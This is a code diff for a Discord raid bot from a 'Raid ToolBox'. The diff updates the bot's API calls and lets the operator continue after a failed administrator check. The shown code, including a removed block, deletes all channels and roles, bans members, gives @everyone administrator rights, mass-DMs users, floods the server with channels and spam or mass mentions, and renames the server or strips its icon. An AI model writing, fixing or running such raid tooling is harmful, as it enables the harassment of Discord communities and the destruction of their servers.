@@ -185,7 +185,7 @@ async def serverselect():
     print("Logged in as {}".format(client.user.name+"#"+client.user.discriminator))
     print("{} is in the following channels: \n".format(usert))
     counter = -1
-    for serv in client.servers:
+    for serv in client.guilds:
         membcount = 0
         for member in serv.members:
             membcount += 1
@@ -197,9 +197,11 @@ async def serverselect():
     if servernum.lower() == 'back':
         print ("Returning to Raid ToolBox.")
         await client.close()
+        await asyncio.sleep(2)
     elif servernum.lower() == 'b':
         print ("Returning to Raid ToolBox.")
         await client.close()
+        await asyncio.sleep(2)
     else:
         try:
             SERVER = lists[int(servernum)]
@@ -210,12 +212,12 @@ async def serverselect():
 async def main(SERVER):
     #options
     clear()
-    server = client.get_server(SERVER)
+    server = client.get_guild(int(SERVER))
     print ("Server: " + server.name)
     print ("Server ID: " + str(SERVER))
     print ("----------------------------------------")
     print ("Options:")
-    print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Destroy with config settings.  \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Raid ToolBox Menu","green"))
+    print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server. \n 5. Return to Raid ToolBox Menu","green"))
     opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
     toggleopts = {
         'namechange' : namechange,
@@ -250,8 +252,8 @@ async def main(SERVER):
             async def changesettings(toggleopts,SERVER):
                 try:
                     clear()
-                    server = client.get_server(SERVER)
-                    print (colored("Type 'start' to start the smashing","green"))
+                    server = client.get_guild(int(SERVER))
+                    print (colored("Type 'start' to start.","green"))
                     print (colored("0.  Go back","green"))
                     print (colored("1.  Change server name: {}".format(toggleopts['namechange']),"green"))
                     print (colored("2.  New Server Name: {}".format(toggleopts['servname']),"green"))
@@ -278,16 +280,17 @@ async def main(SERVER):
                     print (colored("23. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),"green"))
                     toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                     if toga.lower() == "start":
-                        channellist = []
-                        sc = 0
-                        for c in server.channels:
-                            myperms = c.permissions_for(server.get_member(client.user.id))
+                        for channel in server.channels:
+                            myperms = channel.permissions_for(server.get_member(client.user.id))
                             if myperms.administrator:
-                                channellist.append(c)
+                                pass
                             else:
                                 print (colored("You do not have the permissions to destroy this server.","red"))
-                                input ()
-                                await main(SERVER)
+                                con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
+                                if con.lower() == 'y':
+                                    pass
+                                else:
+                                    await main(SERVER)
                         if toggleopts['chandel'] == True:
                             print('Deleting channels.')
                             for channel in server.channels:
@@ -312,7 +315,7 @@ async def main(SERVER):
 
                         if toggleopts['namechange'] == True:
                             print('Changing server name...')
-                            await client.edit_server(server=server, name=str(toggleopts['servname']))
+                            await server.edit(name=str(toggleopts['servname']))
 
                         if toggleopts['iconbegone'] == True:
                             print('Removing icon...')
@@ -503,116 +506,6 @@ async def main(SERVER):
             await changesettings(toggleopts,SERVER)
 
         elif int(opts) == 2:
-            #actions
-            for c in server.channels:
-                myperms = c.permissions_for(server.get_member(client.user.id))
-                if myperms.administrator:
-                    channellist.append(c)
-                else:
-                    print (colored("You do not have the permissions to destroy this server.","red"))
-                    input ()
-                    await main(SERVER)
-            if chandel == True:
-                print('Deleting channels.')
-                for channel in server.channels:
-                    print (colored("Deleting " + str(channel.name),"blue"))
-                    pool.add_task(deletechannel,channel.id)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-                print('Finished deleting channels.')
-
-            if roledel == True:
-               print ('Deleting Roles.')
-               for role in server.roles:
-                    print (colored("Deleting role: " + role.name,"blue"))
-                    pool.add_task(deleterole,role.id,SERVER)
-               await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-               print('Finished deleting roles.')
-
-            if senddm == True:
-                for user in server.members:
-                    print (colored('Sending DM to ' + user.name,"blue"))
-                    pool.add_task(senddmtouser,user.id,dmcontent)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-            if namechange == True:
-                print('Changing server name...')
-                await client.edit_server(server=server, name=str(servname))
-
-            if iconbegone == True:
-                print('Removing icon...')
-                await client.edit_server(server=server, icon=None)
-
-            if changeicon == True:
-                print('Changing icon...')
-                if sys.platform.startswith('win32'):
-                    icofile = ".\\spammer\\serversmasher\\" + iconfile
-                elif sys.platform.startswith('linux'):
-                    icofile = "spammer/serversmasher/" + iconfile
-                with open(icofile, 'rb') as handle:
-                    icon = handle.read()
-                    await client.edit_server(server, icon=icon)
-
-            if giveeveryoneadmin == True:
-                print('Giving everyone admin...')
-                for role in server.roles:
-                    if role.name == '@everyone':
-                        await client.edit_role(server=server, role=role,permissions=Permissions.all())
-
-            if userban == True:
-                print('Banning users...')
-                for user in server.members:
-                    if str(user) in userid:
-                        print (colored("Not Banning " + str(user.name),"green"))
-                    else:
-                        print (colored('Banning ' + str(user.name),"blue"))
-                        pool.add_task(banuser,user.id,SERVER)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-
-            if gimmieadmin == True:
-                print('Giving you admin...')
-                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
-                user = server.get_member(me)
-                await client.add_roles(user, role)
-
-            if createchan == True:
-                print('Creating channels.')
-                for x in range(int(channelno)):
-                    if chanmethod.lower() == "ascii":
-                        asc = ""
-                        for x in range(60):
-                            num = random.randrange(13000)
-                            asc = asc + chr(num)
-                        pool.add_task(createchannel,SERVER,asc,"text")
-                    if chanmethod.lower() == "set":
-                        pool.add_task(createchannel,SERVER,channame,"text")
-
-                    if chanmethod.lower() == "voice":
-                        pool.add_task(createchannel,SERVER,channame,"voice")
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-
-                print ('Channels Created.')
-
-            if chanmethod.lower() == "voice":
-                if chandel == True:
-                    print (colored("Not spamming, due to there only being voice channels in this server.","red"))
-                    await loop.run_in_executor(ThreadPoolExecutor(), input())
-                    await main(SERVER)
-
-            if usespam == True:
-                print('Spam will start in 5 seconds.')
-                if spammethod == "asc":
-                    await ascii_spam(SERVER,usetts)
-                if spammethod == "massment":
-                    await mass_tag(SERVER,usetts)
-                if spammethod == "text":
-                    await text_spam(SERVER,customtxt,usetts)
-                if spammethod == "everyone":
-                    await everyonespam(SERVER,usetts)
-            else:
-                print ("Finished!")
-                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
-                await main(SERVER)
-
-        elif int(opts) == 3:
             for channel in server.channels:
                 if channel.type == discord.ChannelType.text:
                     invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
@@ -630,12 +523,12 @@ async def main(SERVER):
                     await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                     await main(SERVER)
 
-        elif int(opts) == 4:
+        elif int(opts) == 3:
             play = input ("Playing ")
             await client.change_presence(game=discord.Game(name=play))
             await main(SERVER)
 
-        elif int(opts) == 5:
+        elif int(opts) == 4:
             print ("Are you sure you want to leave this server? (Y/N): ")
             yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
             if yn.lower() == 'y':
@@ -645,7 +538,7 @@ async def main(SERVER):
             else:
                 await main(SERVER)
 
-        elif int(opts) == 6:
+        elif int(opts) == 5:
             print ("Returning to Raid ToolBox.")
             await client.close()
 
